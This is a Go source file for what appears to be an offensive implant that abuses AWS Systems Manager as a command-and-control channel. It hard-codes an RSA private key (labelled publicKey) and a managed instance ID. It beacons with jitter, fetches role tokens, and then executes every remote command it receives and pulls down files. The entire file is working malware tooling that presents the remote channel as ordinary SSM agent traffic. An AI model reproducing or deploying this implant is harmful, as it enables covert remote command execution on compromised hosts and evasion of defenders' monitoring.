package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/aws/amazon-ssm-agent/agent/jsonutil"
	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/implantrun"
	"github.com/grines/ssmmm/implant/implantup"
	"github.com/grines/ssmmm/implant/implantutil"
)

const managedInstanceID string = "mi-0c04d4f75f43efc19"
const publicKey string = "MIIEpAIBAAKCAQEAz9P3R25fX3vwQfdJ0UZcUUeQVfY8q1giiSNLvkM8CaK6OGV2WMgfrQqRAqcPeLsGEBsh70DG2OLVhjndJZqSseivTS4b2/wzTCEAWjf+moLTVsNMXjs3hTt++PJI7v9VD+cRqC5CMfUFQCJENWAczGynJqyACSyB1DetiZB7YfKmKfCiruzr83gq9teuDYWHGCn/kzga+uTTtX7m9V+UQsxKqeRcQwSQ60Ef58efC8+A5mYEreTTF+rkYgDw4cDH2chBapBw5pyJe/+6RvffhrEFPYaSrkBWS4yTedND9HuIAz7ch6psT8XRcwg0//jHq7DopavRbdacGPBclYgseQIDAQABAoIBAQDKPLweuJr6ccLEjn04tr1TIs6jt/Al1KgWx1AHn6mmvsFz69gUYPniC6w85pC5rVUjCyQki+Z0W5fo/BnlY9toYMNl2X6mvW61oE+Ve3O4q6I4heeksv8+GT1fx3WNjM4boYGfJRSpRIONe0rgndyoWPr3OVmGk9bqyhuHCB/omNQg6mzzOwynp4hav0WL8BK9s8pBmLXVGflSoQiyKHen/IE/kJuM2Berp3FENr9KfhzdFv1/GyotRtCYOzdjbjQAU7pUoIEinPhhLBZ2J51mZgylx3dbcqtL/d45B5TkDLOT3AAtrvSvvojwwUQVKzVrMMPN3hZ1pVTezKUECrdhAoGBANz4S5JjKe3dGvLiwXgiYdn0uRX0K999rx5U3meb86z58lQlIHUtEX0kw1VPk/KdtHBo5BTDiTvjVmmNwvrZFyoB5/fiCNXlvCPK9w+/HZybzTAAl+z8D3SF3x+MINHbbLFTo0iulpp5cr/RKLkbbaZfnXVumnuT6BPZL67ld0RdAoGBAPDGU92O4wCEYkbhsb4fZb0n6SUzvriQQwirTiMnrFTq+7mp1zsAEM/rtuCV59sV/StfVF+51O8bJGeQmpwZAHxQk08MIIfLjUSIrGfi6Oo4Y8z4MWobISCXY7IOadJRsxmj4UeOSe3kuwBLPwrDdiRAACdorOIhuNxSRqgEWUbNAoGATYSxhk5RdEe/33tbIdj1+O9YSvJYvdOqrnpZd4GHT6Rztb88jr7bxsox2GjNXyyiE1lIwlwCdccAFpGL2FJ2RN9cUGK0dM1eXjQizhxeuAUUS4W5xoJ6rYcVSkzvao+OpvrPan0NCm4WqmIm5iFQKzCZ3YuKmFW/8c6cYr/PQmUCgYADTJRlmsmdfjLiicEnu8JnHx7gtZ7NZJymh8JgVPDVkQq19o/ObSfN0YsF9MfihqCbcYj0btVuGU8cZCzaKrWI/ommMaJYef+Litvh6IgMfY1Qh64VqB2CFtD05aGpkhkEJuy1UEvPCK1PSbipaxg5Uu8tmw+TYaboze/N6ZFXmQKBgQCv+CAZpQC2ggNx2Ez8qQw41gZ+UmwKBZ2WULaP1zIMUcid9ja7fPvX0ScNJ/KlV2xkcSc3XHADPMN9u5wOC5jUlPDo3/xatbCrsrRDAgh56gGi7/6/7D98jLVpUIse23S/iz/JgzUkGspnPrt5FnqT6/EsPw+eJS9vwbu7fcVA+Q=="
const fingerPrint string = "a4e3321b-c692-469e-6c18-93d6d3ef2a05"
const instanceRegion = "us-west-2"
const sleep time.Duration = 100000000
const Usedocs = true

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {

	for {

		jitter := time.Duration(rand.Int63n(int64(sleep)))
		jit := sleep + jitter/2
		fmt.Println(jit)
		time.Sleep(jit)

		//Get Service Role Token from RSA private key
		tokens, err := awsssm.GetRoleTokenFromRSA(managedInstanceID, publicKey, instanceRegion, fingerPrint)
		if err != nil {
			fmt.Println(err.Error())
		} else {

			//Update instace information to active
			awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)

			if Usedocs == true {
				messages, _ := awsssm.GetRunCommandMessagesDocs(tokens, managedInstanceID, instanceRegion)

				//Loop through and run commands
				for _, m := range messages.Commands {
					cmdid := m.CommandID
					if m.OutputS3KeyPrefix != "" {
						//awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
						implantup.RecieveFileDocs(messages)

					} else {
						for _, c := range m.Parameters.Commands {
							str := fmt.Sprintf("%v", c)
							implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion, "docs")
						}

					}
				}
			} else {

				//Get pending RunCommands
				messages, _ := awsssm.GetRunCommandMessages(tokens, managedInstanceID, instanceRegion)

				//Loop through and run commands
				for _, m := range messages.Messages {
					var payload awsssm.SendCommandPayload
					json.Unmarshal([]byte(m.Payload), &payload)
					jsonutil.Marshal(payload)
					cmdid := payload.CommandID
					if payload.OutputS3KeyPrefix != "" {
						awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
						implantup.RecieveFile(payload)

					} else {
						for _, c := range payload.Parameters {
							str := fmt.Sprintf("%v", c)
							str = strings.TrimSuffix(str, "]")
							str = implantutil.TrimFirstRune(str)
							implantrun.RunCommand(str, cmdid, tokens, managedInstanceID, instanceRegion, "messages")
						}

					}
				}
			}
		}
	}

}
